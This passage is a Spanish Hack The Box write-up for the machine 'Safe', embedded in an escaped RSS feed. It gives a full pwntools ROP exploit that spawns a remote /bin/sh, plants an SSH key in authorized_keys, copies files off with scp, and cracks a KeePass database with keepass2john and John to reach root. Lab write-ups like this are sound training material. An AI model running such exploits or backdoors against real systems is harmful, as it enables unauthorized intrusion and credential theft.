-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binSH&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;popR13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En primer lugar estamos introduciendo una cadena de &lt;em&gt;112 bytes&lt;/em&gt;, posteriormente introducimos nuestro código malicioso que suma una longitud de &lt;em&gt;8 bytes&lt;/em&gt;, de modo que estaríamos ya, sobrescribiendo el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSP&lt;/code&gt;, que se convertirá en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSI&lt;/code&gt;, posteriormente, haremos una llamada al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadget pop&lt;/code&gt;, al cual le pasaremos como argumentos lo que nos solicita, la dirección de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R13&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R14&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R15&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RET&lt;/code&gt;, los cuales valdrán la dirección de la llamada al sistema, valor nulo, valor nulo y como función de regreso, la dirección de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;, redirigiendo así, el flujo del programa a través de esa función.&lt;/p&gt;
-
-&lt;p&gt;Ya lo que nos quedaría, sería ejecutar nuestro script, no de manera local, pero remota, para lo cual debemos introducir la dirección IP de la máquina víctima, e indicar el puerto a través del cual nos queremos conectar.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;10.10.10.147&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Así mismo, es necesario especificar que queremos interactuar con la consola que estamos consiguiendo, para lo cual deberemos indicar lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nuestro script, debería verse algo así:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gnome-terminal&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-x&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# p = gdb.debug(&apos;/ubicación/del/binario/myapp&apos;, &apos;b *0x40116e&apos;)
-# p.recvuntil(&quot;What do you want me to echo back?&quot;)
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;10.10.10.147&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;popR13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x401206&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40116e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x401152&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
- 
-&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-  
-&lt;span class=&quot;n&quot;&gt;binSh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-  
-&lt;span class=&quot;n&quot;&gt;nullByte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binSh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;popR13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nullByte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nullByte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al ejecutar nuestro script, lo que vamos a conseguir es una consola, por lo que una vez dentro del sistema, podríamos listar la flag del usuario con bajos privilegios.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / -name user.txt 2&amp;gt; /dev/null
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/28.png&quot; alt=&quot;28&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;
-
-&lt;p&gt;Para conseguir la flag del usuario con máximos privilegios, podemos emepezar por listar el contenido dentro de la carpeta del usuario user.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/29.png&quot; alt=&quot;29&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos vamos a encontrar con una serie de imágenes, en adición de un archivo de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.kdbx&lt;/code&gt;, el cual guarda relación con el gestor de contraseñas KeePass. Debido a que nos encontramos en una máquina remota, no podremos visualizar las imágenes alojadas dentro de la máquina víctima, por lo que tenemos que buscar una forma de transferirlas a nuestro equipo.&lt;/p&gt;
-
-&lt;p&gt;Si recordamos, el puerto 22 estaba abierto, por lo que podríamos conectarnos por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; a la máquina remota, no obstante, ¿cómo nos vamos a conectar sin proporcionar credenciales? Esto lo haremos introduciendo nuestra clave pública, dentro de un archivo de nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; ubicado en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh&lt;/code&gt;, dentro del directorio del usuario user.&lt;/p&gt;
-
-&lt;p&gt;Lo primero que haremos será crear un par de claves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, una pública, y una privda, esto lo haremos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-key&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd ~/.ssh/
-ssh-keygen
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/30.png&quot; alt=&quot;30&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En caso de querer ingresar algún tipo de contraseña, se lo puede hacer. Ya teniendo el par de claves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, vamos a copiar el contenido de nuestra clave pública, para posteiormente añadirla en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/user/.ssh/authorized_keys&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;nuestraClavePública&quot; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez hecho esto, podemos conectarnos a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; a la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh user@10.10.10.147
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/32.png&quot; alt=&quot;32&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En vista de que estamos conectados a la máquina vía &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;, podríamos intentar transferir los archivos del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/user/&lt;/code&gt;, haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SCP&lt;/code&gt; (&lt;em&gt;Secure Copy Protocol&lt;/em&gt;), aunque también pudimos haberlo hecho creando un servidor en la máquina remota mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Busybox&lt;/code&gt;, y posteriormente, descargando las imágnes a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wget&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp &quot;user@10.10.10.147:/home/user/*&quot; .
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/33.png&quot; alt=&quot;33&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez tengamos tanto las imágenes como el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MyPasswords.kdbx&lt;/code&gt; en nuestro equipo, podemos empezar a analizar que hacer con ello; dudo mucho que las imágenes tengan algo que ver con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esteganografía&lt;/code&gt;, ya que si abrimos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MyPasswords.kdbx&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepassxc&lt;/code&gt;, nos pregunta por un archivo clave.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/34.png&quot; alt=&quot;34&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En caso de no contar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepassxc&lt;/code&gt; instalado, podemos hacer lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install keepassxc
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya en este punto, lo que se nos podría ocurrir sería intentar aplicar fuerza bruta sobre el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MyPasswords.kdbx&lt;/code&gt;, no obstante, primero tendremos que pasar de formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KeePass&lt;/code&gt;, a formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;, para crackear la contraseña haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt;, de modo que usaremos  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepass2john&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Antes de hacerlo hay que recordar que las imágenes están por algo, para lo cual se las pasaremos como argumento a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keepass2john&lt;/code&gt;, mediante el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-k&lt;/code&gt;. Esto se vería algo así:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;keepass2john &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &amp;lt;imagenDeseada&amp;gt; MyPasswords.kdbx
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Esto va a hacer el trabajo, pero podemos reducir tiempo automatizándolo, para ello haremos uso de un &lt;em&gt;bucle for&lt;/em&gt;, para ir iterando sobre cada imagen.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;image &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;keepass2john &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$image&lt;/span&gt; MyPasswords.kdbx&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/35.png&quot; alt=&quot;35&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Utilizar el comando anterior nos sirve, sin embargo, si lo pensamos un poco, si redirigimos este ouput a un fichero hashes.txt, por ejemplo, al cual luego le aplicaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;, cuando este encuentre la contraseña, nos dirá que la imágen que utilizó fue &lt;em&gt;MyPasswords&lt;/em&gt;, lo cual no nos es de ayuda, por lo que podemos reemplazar &lt;em&gt;MyPasswords&lt;/em&gt;, por el nombre de la imagen.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;image &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;keepass2john &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$image&lt;/span&gt; MyPasswords.kdbx | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/MyPasswords/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$image&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; nombreArchivo
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/36.png&quot; alt=&quot;36&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Finalmente, para crackear la contraseña, haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; en conjunto del diccionario &lt;a href=&quot;https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&amp;amp;X-Amz-Date=20220209T031834Z&amp;amp;X-Amz-Expires=300&amp;amp;X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&amp;amp;X-Amz-SignedHeaders=host&amp;amp;actor_id=79855501&amp;amp;key_id=0&amp;amp;repo_id=97553311&amp;amp;response-content-disposition=attachment%3B%20filename%3Drockyou.txt&amp;amp;response-content-type=application%2Foctet-stream&quot;&gt;rockyou.txt&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install john
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo john --wordlist=/ruta/del/diccionario/rockyou.txt nombreArchivo
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/37.png&quot; alt=&quot;37&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez conseguimos tanto la contraseña como el archivo clave, ya podremos abrir el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MyPasswords.kdbx&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/38.png&quot; alt=&quot;38&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/39.png&quot; alt=&quot;39&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y ya con la contraseña del usuario root en nuestro poder, podremos listar la última flag.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2021-12-27-Safe-Hack-The-Box/40.png&quot; alt=&quot;40&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-</description>
-        <pubDate>Mon, 27 Dec 2021 00:00:00 -0500</pubDate>
-        <link>/es/Safe-Hack-The-Box/</link>
-        <guid isPermaLink="true">/es/Safe-Hack-The-Box/</guid>
       </item>
     
   </channel>
